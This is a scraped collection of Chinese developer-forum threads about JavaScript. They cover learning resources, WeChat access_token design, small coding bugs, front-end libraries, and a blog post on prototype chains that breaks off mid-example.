{"content": ["<div class=\"topic_content\">现在看了js权威指南 6ed 看了1/4 感觉实在太厚 而且忘得快，有木有快速轻松爽的书，或者文章</div>"], "reply": "32", "tittle": "有 python 经验 如何快速学 javascript", "comment": ["实践,实践,遇到问题再翻书", " 怕写的坑被同事骂", "javascript 语言精粹 可以看看", " 看上去不错，起码有杜蕾斯般的厚度", "廖雪峰的JavaScript教程，在线的", "隔壁学到的，面向搜索引擎编程最快 XD", "敢不敢直接看 coffee script，能少很多坑，调试的时候，你也能看懂，毕竟语言也就语法细节而已。", "目前在看《Head First JavaScript》，感觉还行吧。", "Professional JavaScript for Web Developers\r", "Effective JavaScript: 68 Specific Ways to Harness the Power of JavaScript \r", "JavaScript Patterns\r", "High Performance JavaScript (Build Faster Web Application Interfaces)\r", "JavaScript: The Good Parts\r", "\r", "以上，依次", "see ", "\r", "see ", "面向搜索引擎编程的精华是实践", "以下内容都是亲身经历过才说的：\r", "如果想要精简的：推荐w3cshool上看教程；\r", "如果想系统的学JavaScript；推荐高程三，这本书比犀牛书还要屌的！强烈推荐此书！\r", "还有就是有一本叫JavaScript DOM编程艺术的入门书，这本书强烈不建议买！买了看过一遍后，发现写的超级水！唯一推荐的就是高程三（全名：JavaScript高级程序设计(第3版)  封面是一个小孩玩望远镜的图）", "没有捷径，只有技巧，技巧是练出来的。", "犀牛书用来做工具书，看蝴蝶书好一些", "所以结论是我看错书了 😂", "看了1/4用多久了？", "权威指南 6 是最好的书之一，耐心啃完，然后多写", "读了之后没有读完，下次接着读下去吧，不建议回头读（这次回头，下次还是想着回头的", "没有捷径\r", "以后js你可以用20年\r", "何必在意朝朝暮暮", "似乎可以直接上 CoffeeScript", "来来直接Coffee好了喵～", " 为什么为什么为什么..", " CoffeeScript 可以看作类Python语法的映射", " 已买书，等今天撸完上面推荐的js高级编程就学它 =w=", " 什么叫面向搜索引擎的编程？\r", "一边写，不懂的问搜索引擎吗？", " 是啊\r ", " 2L看到的。。", "Javascript the Good Part，写的挺好的，我也是先学 Python 再学的 JS", "去抓一些数据. 然后页面呈现出来, 做一个web版的excel, 实现excel的复制粘贴, 框选, 点选, 排序. 剪贴. 高亮, 列插入, 行插入. 然后兼容IE7,8,9,10,11,FF,Chrome. js就差不多了.", "直接上 D3.js 这个库，连初学 js 带初学 d3\r", "为什么一提到学 JavaScript 就提犀牛书，事实上我觉得 Zakas 的《JavaScript 高级程序设计》比犀牛书强多了，虽然书名含有“高级”二字，但是实际上这本书更适合入门。犀牛书我也买了，但是根本没翻过几次，要查 API 直接看 MDN 就够了，个人觉得这本书并没有什么卵用。", "\r", "\r", "我目前写了2篇博客，陆陆续续改了好多次，觉得还是把js的要点写出来了。希望对你有帮助。", " 两本书都看了一半，正在看高级编程，给我的感觉就是犀牛书的代码比较老道，而且讲的很细，高级编程更像一本教科书"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近准备试试看微信的 <a target=\"_blank\" rel=\"nofollow\" href=\"http://mp.weixin.qq.com/wiki/15/54ce45d8d30b6bf6758f68d2e95bc627.html\">JSSDK</a></p>\n\n<p>可是有一个地方不是让我很理解... 微信是需要使用 access_token 来访问的. 而 access_token 是使用 appsecret 生成的. 需要服务器保存. 2小时内有效.</p>\n\n<p>我不解的是这样的好处是什么? 保证 appsecret 的安全么? 可是这个 access_token 还是明文的啊. 在 js 端可以看到的啊. 如果别人需要用你的 access_token 只要定时趴一下你的页面不就行了? 这个和直接一个key有什么区别</p>\n</div></div>"], "reply": "15", "tittle": "不解微信 access_token 的作用", "comment": ["这是你后端保存与微信服务器交互用的啊。", " 不是很理解, 可以具体介绍一下么? 我不理解的是 access_token 一样是明文的. 而且有 2小时 有效期. 这样不是等于一个\"密码\"么.", "只有你的设备能看得见的明文，对别人来说看不到，就是密文", "客户端只看到自己的而已", "access_token 不能暴露在网页里啊，网页里（其实是js里）需要的是已经计算好的签名 signature \r", "而签名是根据当前网页 URL 来计算的，所以别人获取到了也没意义", "access_token是你的服务器和微信通讯用的，不是在客户端和微信通讯用的\r", "\r", "你不会直接在网页里用JS和微信服务器通讯吧", " 哦~~~ 我理解错了. 原来 signature 是根据 url 计算的哦. 明白了. 谢谢你的解释\r", "\r", " @", " @", " @", " 谢谢大家", "是明文，但是除非别人已经拿到了你的手机设备，否则别人不太可能远程获取到。", " 是我不好... 误解了 signature 和 access_token 的区别. 明文的应该是 signature. 而且我不知道 signature 是根据 url 生成的...\r", "\r", "但是我又有疑惑了. 那既然这样为啥不直接使用 appsecret 来生成 signature ?", " \r", "\r", "access_token表示用户对你的服务暂时授权了。\r", "appsecret是腾讯分给你的用于区分你的服务和别人的服务，同时对你的服务进行加密的。\r", "仔细想一下，就清楚这几个地方了。", "appsecret是没有时效的", " @", " 根据微信的文档我的理解是\r", "\r", "appsecret(没有时效) -[api]-> access_token(2小时) -[根据url和返回的token生成] -> signature\r", "\r", "这些不都是发生在我服务器这端的么? 为什么中间需要一个这个 access_token?", "用了OAuth2.0协议，就继续用下去呗", "引用文档：\r", "1、为了保密appsecrect，第三方需要一个access_token获取和刷新的中控服务器。而其他业务逻辑服务器所使用的access_token均来自于该中控服务器，不应该各自去刷新，否则会造成access_token覆盖而影响业务；\r", "2、目前access_token的有效期通过返回的expire_in来传达，目前是7200秒之内的值。中控服务器需要根据这个有效时间提前去刷新新access_token。在刷新过程中，中控服务器对外输出的依然是老access_token，此时公众平台后台会保证在刷新短时间内，新老access_token都可用，这保证了第三方业务的平滑过渡；\r", "3、access_token的有效时间可能会在未来有调整，所以中控服务器不仅需要内部定时主动刷新，还需要提供被动刷新access_token的接口，这样便于业务服务器在API调用获知access_token已超时的情况下，可以触发access_token的刷新流程。\r", "----------------------------------------------------\r", "业务服务器使用由中控获取的access_token比把appsecrect放在每一个的业务服务器要安全吧，就算万一中控的appsecrect泄露，只需要修改中控就可以了，不会影响到业务服务器", "没看到 js 可以取 access_token"]},
{"content": ["<div class=\"topic_content\">跟 react native 有点不同，看起来各有千秋</div>"], "reply": "7", "tittle": "有人试过 Nativescript 吗？", "comment": ["只有我看成naive吗？", "貌似不错，同时生成iOS和Android的APP", "貌似编译出来的APP就是一个WebBrowser容器，代码在容器里运行，容器再提供一些访问本地API的javascript接口。", "我只能说，web容器类型的app都有其使用的限制，在使用限制内是ok的，但是一旦业务复杂，就会产生超级多的问题。", "用的是自己的nativescript，界面业务最后会好复杂。。", " 有试 react native 吗？", " 没事，感觉八九不离十"]},
{"content": ["<div class=\"topic_content\">－－－－－－－－－－－－－－－－－－－－－－－－\r<br><a target=\"_blank\" href=\"https://github.com/Soopro/svg-sprites-render\" rel=\"nofollow\">https://github.com/Soopro/svg-sprites-render</a>\r<br>\r<br>bower install svg-sprites-render\r<br>－－－－－－－－－－－－－－－－－－－－－－－－\r<br>\r<br>文档看github里面的\r<br>\r<br>js 读取svg sprites 文件，并且根据html 中的属性，将sprite单元渲染到对应svg tag中。支持 icomoon 之类的 svg sprites 生成器生成的svg 文件。\r<br>\r<br>写这个的目的是为了让svg sprite在使用的时候 能具备 inline svg的特性，可以用css fill color 之类的特性，如果用 svg 做 background 不用遮罩干不了这事儿，而且大小宽高 在不同浏览器里面实际上是有差别的（这也要看svg生成的好不好）\r<br>\r<br>搜到有一说可以用 svg fragment 类似 svg_name.svg#fragId 之类的方式通过src加载，我之前也试过，然而并没有什么卵用。 在Safari有跳帧的现象。\r<br>\r<br>两天没有找到靠谱的库（snap svg 可以用，但是太重，没有选）\r<br>\r<br>往上搜到过一些说用svg sprite 不好的地方，那么用这个脚本 干脆就把 svg inline了。\r<br>只要是现代浏览器，都应当完美支持。\r<br>\r<br>昨天一些人也没有见靠谱的解决方案，于是自己写一个凑合用先。\r<br>在 angular material 中用类似的效果，实现它的 md-icon，它咋个实现我没看，但是html 上写的时候差不多。\r<br>\r<br>PS: 老IE 支持不支持 不在我的考虑之内，很抱歉。。。微软自己都不要的东西，我也不会鸟他。</div>"], "reply": "2", "tittle": "写了一个 JS 将 svg sprite 加载到页面上脚本，已经放在 github，可以 bower 安装", "comment": ["还以为是妹纸", "Update 到 0.0.5 此前的版本 忘了 safari 和 opera 的支持。太傻逼了。。。今天用的时候发现了就修掉了。\r", "IE 还是没有测，理论上说 IE 10 以上可以支持。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>从string中选出最长的单词。</p>\n\n<p>比如对“fun&amp;!! time\"执行，结果应该是“time\".</p>\n\n<p>请问为什么我写的这个不行呢？</p>\n\n<p>function LongestWord(sen) { <br>\n  var newSen = sen.replace(/[^\\w\\s]/, \"\");<br>\n  var array = newSen.split(\" \");<br>\n  var longest = array[0].length;<br>\n  var word = array[0];<br>\n  for (i = 1; i &lt; array.length; i++){<br>\n    if (array[i].length &gt; longest){<br>\n      var longest = array[i].length;<br>\n      var word = array[i];<br>\n    }<br>\n  }<br>\n  return word;<br><br>\n}</p>\n\n<p>给的提示是 SyntaxError: Invalid character '\\u8220' </p>\n\n<p>谢谢！</p>\n</div></div>"], "reply": "5", "tittle": "选出最长的单词", "comment": ["你这replace不对吧？就拿你写的例子为例，&！！不是/[^\\w\\s]/里面任何一个啊，你那array里面拿到的是['fun&!!',‘time’]啊，自然返回的不是time啊。你这是用的js吗？还是其他什么语言", "你的双引号 是全角的？\r", "请确保你的输入正确，SyntaxError是有错误行号的\r", "stupid question", " @", " @", " 谢谢三位！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近帮忙朋友做一个网站，其中有一个浏览图片并放大细节的功能。但是这个放大镜的功能总写不对。按照code，我只是在一个手表图片上测试这个放大镜的功能。可是我在预览其他图片的时候，放大镜也会出现，并且显示放大的手表细节。</p>\n\n<p>如图所示<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://i.imgur.com/43wuadT.jpg?1\">http://i.imgur.com/43wuadT.jpg?1</a></p>\n\n<p>求大神们指教</p>\n<div class=\"highlight\"><pre>&lt;link rel=\"stylesheet\" href=\"dist/css/magnify.css\"&gt;\n&lt;link rel=\"stylesheet\" href=\"dist/jquery.rondell.css\" type=\"text/css\" media=\"all\" title=\"Screen\"&gt;\n\n\n &lt;div id=\"rondellGallery\" style=\"height:400px;\"&gt;\n    &lt;img src=\"watch-large.jpg\" data-magnify-src=\"watch-large.jpg\"&gt;\n    &lt;img src=\"pic2.png\" alt=\"unicorn\" title=\"A beautiful unicorn\"&gt;\n    &lt;img src=\"pic3.png\" alt=\"unicorn\" title=\"A beautiful unicorn\"&gt;\n    &lt;img src=\"pic4.png\" alt=\"unicorn\" title=\"Pic 4\"&gt;\n &lt;/div&gt;\n\n\n&lt;script src=\"libs/modernizr-2.0.6.min.js\"&gt;&lt;/script&gt;\n&lt;script src=\"https://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js\"&gt;&lt;/script&gt;\n&lt;script src=\"dist/js/jquery.magnify.js\"&gt;&lt;/script&gt;\n\n&lt;script src=\"libs/jquery.mousewheel-3.0.6.min.js\"&gt;&lt;/script&gt;\n&lt;script src=\"dist/jquery.rondell.js\"&gt;&lt;/script&gt;\n\n\n&lt;script type=\"text/javascript\"&gt;\n\n    $(document).ready(function() {\n\n    $('img').magnify();\n\n    $(\"#rondellGallery\").rondell({\n        preset: \"thumbGallery\"\n    });\n});\n\n&lt;/script&gt;\n</pre></div>\n</div></div>"], "reply": "2", "tittle": "求问一个图片放大镜的问题", "comment": ["$('img').magnify(); \r", "----你自己把所以图都选择了啊\r", "你把要放大的图片加上独立的class 比如 magnify 然后用  $('.magnify').magnify(0", " 不好意思最近玩high了。刚刚按你的方法试了一下，同样的问题还是存在"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://ufologist.github.io/responsive-page/\">responsive-page</a> 让你的页面轻松适配各种移动设备和PC端浏览器, 1.46 KB only! 无任何其他依赖.</p>\n\n<ul>\n<li>非常适合专题landing页</li>\n<li>页面内容一般为几张图片拼接</li>\n<li>同时要适配移动端和PC端</li>\n<li>要自适应宽度</li>\n<li>(绝对)定位元素仅需使用px单位即可适配</li>\n<li>切图时仅需切640宽(可以配置)的图片</li>\n<li>即使内容很长, 换行也需要正确</li>\n</ul>\n\n<p><img src=\"http://ufologist.github.io/responsive-page/responsive-page.gif\" alt=\"演示 responsive-page 适配功能\"></p>\n</div></div>"], "reply": "10", "tittle": "让你的页面轻松适配各种移动设备和 PC 端浏览器", "comment": ["马克一个", "帅呆了，感谢已发送。\r", "\r", "就是不知道最终效果怎么样……下次要用的时候试试看:)", "这种东西在PC上……不是很奇怪吗", "好东西啊,感谢推荐", "好，正愁移动端做活动推广页面按钮乱跑的问题，原来都是用rem，现在试试你这个，pc端的话，貌似demo有点问题？按钮跑到了最右边", " 用rem不是挺好的吗", " 我在测试 70c.html 这个demo的时候也遇到了这个现象, 但不用担心是bug, 出现这个问题是由于 demo中引用的 responsive-page.js 通过 ", " 来提供, 下载速度会比较慢造成的延时, 如果是自己 host 的时候是不会出现这个现象的.\r", "\r", "如果有任何bug或者问题, 请发个 [issue](https://github.com/ufologist/responsive-page/issues) 给项目, 非常感谢.", " 写起来太麻烦", "  ok", "太棒了 准备下一个专题试一试"]},
{"content": ["<div class=\"topic_content\">输入是array，如[“apple”, “banana”, “cranberry”]\r<br>\r<br>选出单词中有重复的字母数量最多的一个（如果有一样重复数量的，选第一个），比如刚才例子这一组，选出的是”banana\"（3个a，虽然cranberry也有3个r，但是banana在前，所以选banana）。如果没有单词有重复字母，比如[“a”, “b”]，返回”-1\"。\r<br>\r<br>我下面写的代码，一般都对，但是一但这个有重复的字母数量最多的单词在最后一位，结果就不对（最后的单词似乎没被鉴定），比如[“a”, “bb”, “ccc”]，应返回cc，但我的会返回”bb”.\r<br>\r<br><div><a target=\"_blank\" href=\"https://gist.github.com/yeefom/f68bbc5e051819d7d8ec\">https://gist.github.com/yeefom/f68bbc5e051819d7d8ec</a> <button onclick=\"lazyGist(this)\"> 显示 Gist 代码 </button></div>\r<br>\r<br>\r<br>我知道我写的这个不是最有效率的，但是想知道问题出在哪里，请指教，谢谢！</div>"], "reply": "7", "tittle": "选出单词中有重复的字母数量最多的一个", "comment": ["更正：输入是string，所以第一步我先把它变了array。感谢！", "楼主你这个代码。。我输入 \"a bb ccc\" 输出来的是 -1。你把 return word 放在第一层循环里，循环一次就返回了，后面的字符串怎么能被处理。。", "  哈哈 果然是 看了半天没看出啥问题  原来是这样", "学着写了个 Python 版本\r", "我感觉我还是不会用 Python3 ， return 那里感觉我是傻逼。。。。。。\r", "\r", " 啊！我去！原来如此！\r", " @", " 谢谢两位！", "```clojure\r", "\r", "(defn freq-of-cha\r", "  [str]\r", "  (->> str\r", "       frequencies\r", "       (sort-by val >)\r", "       first\r", "       second\r", "       (vector str)))\r", "\r", " (defn answer\r", "   [col]\r", "   (->> col\r", "        (map freq-of-cha)\r", "        (sort-by second >)\r", "        ffirst))\r", "\r", "```", "排版不好。。挂个gist "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://blog.rainy.im/2015/07/20/prototype-chain-in-js/\">&gt;&gt; 原文 &lt;&lt;</a></p>\n\n<p>本文尝试阐述Js中原型（prototype）、原型链（prototype chain）等概念及其作用机制。上一篇文章（<a target=\"_blank\" rel=\"nofollow\" href=\"http://blog.rainy.im/2015/07/04/scope-chain-and-prototype-chain-in-js/\">图解Javascript上下文与作用域</a>）介绍了Js中变量作用域的相关概念，实际上关注的一个核心问题是：“在执行当前这行代码时Js解释器可以获取哪些变量”，而原型与原型链实际上还是关于这一问题。</p>\n\n<p>我们知道，在Js中一切皆为对象（Object），但是Js中并没有类（class）；Js是基于原型（prototype-based）来实现的面向对象（OOP）的编程范式的，但并不是所有的对象都拥有<code>prototype</code>这一属性：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">a</span> <span class=\"o\">=</span> <span class=\"p\">{};</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">);</span>  <span class=\"c1\">//=&gt; undefined</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">b</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(){};</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">b</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">);</span>  <span class=\"c1\">//=&gt; {}</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">c</span> <span class=\"o\">=</span> <span class=\"s1\">'Hello'</span><span class=\"p\">;</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">c</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">);</span>  <span class=\"c1\">//=&gt; undefined</span>\n</pre></div>\n\n<p><code>prototype</code>是每个<code>function</code>定义时自带的属性，但是Js中<code>function</code>本身也是对象，我们先来看一下下面几个概念的差别：</p>\n\n<h2>1. <code>function</code>、<code>Function</code>、<code>Object</code>和<code>{}</code></h2>\n\n<p><code>function</code>是Js的一个关键词，用于定义函数类型的变量，有两种语法形式：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">function</span> <span class=\"nx\">f1</span><span class=\"p\">(){</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'This is function f1!'</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n<span class=\"k\">typeof</span><span class=\"p\">(</span><span class=\"nx\">f1</span><span class=\"p\">);</span>  <span class=\"c1\">//=&gt; 'function'</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">f2</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(){</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'This is function f2!'</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n<span class=\"k\">typeof</span><span class=\"p\">(</span><span class=\"nx\">f2</span><span class=\"p\">);</span>  <span class=\"c1\">//=&gt; 'function'</span>\n</pre></div>\n\n<p>如果用更加面向对象的方法来定义函数，可以用<code>Function</code>：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">f3</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nb\">Function</span><span class=\"p\">(</span><span class=\"s2\">\"console.log('This is function f3!');\"</span><span class=\"p\">);</span>\n<span class=\"nx\">f3</span><span class=\"p\">();</span>        <span class=\"c1\">//=&gt; 'This is function f3!'</span>\n<span class=\"k\">typeof</span><span class=\"p\">(</span><span class=\"nx\">f3</span><span class=\"p\">);</span>  <span class=\"c1\">//=&gt; 'function'</span>\n\n<span class=\"k\">typeof</span><span class=\"p\">(</span><span class=\"nb\">Function</span><span class=\"p\">);</span> <span class=\"c1\">//=&gt; 'function'</span>\n</pre></div>\n\n<p>实际上<code>Function</code>就是一个用于构造函数类型变量的类，或者说是函数类型实例的构造函数（constructor）；与之相似有的<code>Object</code>或<code>String</code>、<code>Number</code>等，都是Js内置类型实例的构造函数。比较特殊的是<code>Object</code>，它用于生成对象类型，其简写形式为<code>{}</code>：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">o1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nb\">Object</span><span class=\"p\">();</span>\n<span class=\"k\">typeof</span><span class=\"p\">(</span><span class=\"nx\">o1</span><span class=\"p\">);</span>      <span class=\"c1\">//=&gt; 'object'</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">o2</span> <span class=\"o\">=</span> <span class=\"p\">{};</span>\n<span class=\"k\">typeof</span><span class=\"p\">(</span><span class=\"nx\">o2</span><span class=\"p\">);</span>     <span class=\"c1\">//=&gt; 'object'</span>\n\n<span class=\"k\">typeof</span><span class=\"p\">(</span><span class=\"nb\">Object</span><span class=\"p\">);</span> <span class=\"c1\">//=&gt; 'function'</span>\n</pre></div>\n\n<h2>2. <code>prototype</code> VS <code>__proto__</code></h2>\n\n<p>清楚了上面的概念之后再来看<code>prototype</code>：</p>\n\n<blockquote>\n<p>Each function has two properties: <code>length</code> and <code>prototype</code></p>\n</blockquote>\n\n<p><code>prototype</code>和<code>length</code>是每一个函数类型自带的两个属性，而其它非函数类型并没有（开头的例子已经说明），这一点之所以比较容易被忽略或误解，是因为所有类型的构造函数本身也是函数，所以它们自带了<code>prototype</code>属性：</p>\n<div class=\"highlight\"><pre><span class=\"c1\">// Node</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">);</span>  <span class=\"c1\">//=&gt; {}</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nb\">Function</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">);</span><span class=\"c1\">//=&gt; [Function: Empty]</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nb\">String</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">);</span>  <span class=\"c1\">//=&gt; [String: '']</span>\n</pre></div>\n\n<p>除了<code>prototype</code>之外，Js中的所有对象（<code>undefined</code>、<code>null</code>等特殊情况除外）都有一个内置的<code>[[Prototype]]</code>属性，指向它“父类”的<code>prototype</code>，这个内置属性在ECMA标准中并没有给出明确的获取方式，但是许多Js的实现（如Node、大部分浏览器等）都提供了一个<code>__proto__</code>属性来指代这一<code>[[Prototype]]</code>，我们通过下面的例子来说明实例中的<code>__proto__</code>是如何指向构造函数的<code>prototype</code>的：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">Person</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(){};</span>\n<span class=\"nx\">Person</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">.</span><span class=\"nx\">type</span> <span class=\"o\">=</span> <span class=\"s1\">'Person'</span><span class=\"p\">;</span>\n<span class=\"nx\">Person</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">.</span><span class=\"nx\">maxAge</span> <span class=\"o\">=</span> <span class=\"mi\">100</span><span class=\"p\">;</span>\n\n<span class=\"kd\">var</span> <span class=\"nx\">p</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">Person</span><span class=\"p\">();</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">p</span><span class=\"p\">.</span><span class=\"nx\">maxAge</span><span class=\"p\">);</span>\n<span class=\"nx\">p</span><span class=\"p\">.</span><span class=\"nx\">name</span> <span class=\"o\">=</span> <span class=\"s1\">'rainy'</span><span class=\"p\">;</span>\n\n<span class=\"nx\">Person</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">.</span><span class=\"nx\">constructor</span> <span class=\"o\">===</span> <span class=\"nx\">Person</span><span class=\"p\">;</span>  <span class=\"c1\">//=&gt; true</span>\n<span class=\"nx\">p</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span> <span class=\"o\">===</span> <span class=\"nx\">Person</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">;</span>         <span class=\"c1\">//=&gt; true</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">p</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">);</span>                 <span class=\"c1\">//=&gt; undefined</span>\n</pre></div>\n\n<p>上面的代码示例可以用下图解释：</p>\n\n<p><img src=\"http://7xiijd.com1.z0.glb.clouddn.com/js-proto.jpg\" alt=\"js __proto__\"></p>\n\n<p><code>Person</code>是一个函数类型的变量，因此自带了<code>prototype</code>属性，<code>prototype</code>属性中的<code>constructor</code>又指向<code>Person</code>本身；通过<code>new</code>关键字生成的<code>Person</code>类的实例<code>p1</code>，通过<code>__proto__</code>属性指向了<code>Person</code>的原型。这里的<code>__proto__</code>只是为了说明实例<code>p1</code>在内部实现的时候与父类之间存在的关联（指向父类的原型），在实际操作过程中实例可以直接通过<code>.</code>获取父类原型中的属性，从而实现了继承的功能。</p>\n\n<h2>3. 原型链</h2>\n\n<p>清楚了<code>prototype</code>与<code>__proto__</code>的概念与关系之后我们会对“Js中一切皆为对象”这句话有更加深刻的理解。进而我们会想到，既然<code>__proto__</code>是（几乎）所有对象都内置的属性，而且指向父类的原型，那是不是意味着我们可以“逆流而上”一直找到源头呢？我们来看下面的例子：</p>\n<div class=\"highlight\"><pre><span class=\"c1\">// Node</span>\n<span class=\"kd\">var</span> <span class=\"nx\">Obj</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(){};</span>\n<span class=\"kd\">var</span> <span class=\"nx\">o</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">Obj</span><span class=\"p\">();</span>\n<span class=\"nx\">o</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span> <span class=\"o\">===</span> <span class=\"nx\">Obj</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">;</span>  <span class=\"c1\">//=&gt; true</span>\n<span class=\"nx\">o</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span><span class=\"p\">.</span><span class=\"nx\">constructor</span> <span class=\"o\">===</span> <span class=\"nx\">Obj</span><span class=\"p\">;</span> <span class=\"c1\">//=&gt; true</span>\n\n<span class=\"nx\">Obj</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span> <span class=\"o\">===</span> <span class=\"nb\">Function</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">;</span> <span class=\"c1\">//=&gt; true</span>\n<span class=\"nx\">Obj</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span><span class=\"p\">.</span><span class=\"nx\">constructor</span> <span class=\"o\">===</span> <span class=\"nb\">Function</span><span class=\"p\">;</span> <span class=\"c1\">//=&gt; true</span>\n\n<span class=\"nb\">Function</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span> <span class=\"o\">===</span> <span class=\"nb\">Function</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">;</span> <span class=\"c1\">//=&gt; true</span>\n<span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span> <span class=\"o\">===</span> <span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">;</span>     <span class=\"c1\">//=&gt; false</span>\n<span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span> <span class=\"o\">===</span> <span class=\"nb\">Function</span><span class=\"p\">.</span><span class=\"nx\">prototype</span><span class=\"p\">;</span>   <span class=\"c1\">//=&gt; true</span>\n\n<span class=\"nb\">Function</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span><span class=\"p\">.</span><span class=\"nx\">constructor</span> <span class=\"o\">===</span> <span class=\"nb\">Function</span><span class=\"p\">;</span><span class=\"c1\">//=&gt; true</span>\n<span class=\"nb\">Function</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span><span class=\"p\">;</span>               <span class=\"c1\">//=&gt; {}</span>\n<span class=\"nb\">Function</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span> <span class=\"o\">===</span> <span class=\"nx\">o</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span><span class=\"p\">;</span> <span class=\"c1\">//=&gt; true</span>\n<span class=\"nx\">o</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span><span class=\"p\">.</span><span class=\"nx\">__proto__</span> <span class=\"o\">===</span> <span class=\"kc\">null</span><span class=\"p\">;</span>   <span class=\"c1\">//=&gt; true</span>\n</pre></div>\n\n<p><img src=\"http://7xiijd.com1.z0.glb.clouddn.com/js-prototype-chain.jpg\" alt=\"js prototype chain\"></p>\n\n<p>从上面的例子和图解可以看出，<code>prototype</code>对象也有<code>__proto__</code>属性，向上追溯一直到<code>null</code>。</p>\n\n<p><code>new</code>关键词的作用就是完成上图所示实例与父类原型之间关系的串接，并创建一个新的对象；<code>instanceof</code>关键词的作用也可以从上图中看出，实际上就是判断<code>__proto__</code>（以及<code>__proto__.__proto__</code>...）所指向是否父类的原型：</p>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">Obj</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(){};</span>\n<span class=\"kd\">var</span> <span class=\"nx\">o</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">Obj</span><span class=\"p\">();</span>\n\n<span class=\"nx\">o</span> <span class=\"k\">instanceof</span> <span class=\"nx\">Obj</span><span class=\"p\">;</span> <span class=\"c1\">//=&gt; true</span>\n<span class=\"nx\">o</span> <span class=\"k\">instanceof</span> <span class=\"nb\">Object</span><span class=\"p\">;</span> <span class=\"c1\">//=&gt; true</span>\n<span class=\"nx\">o</span> <span class=\"k\">instanceof</span> <span class=\"nb\">Function</span><span class=\"p\">;</span> <span 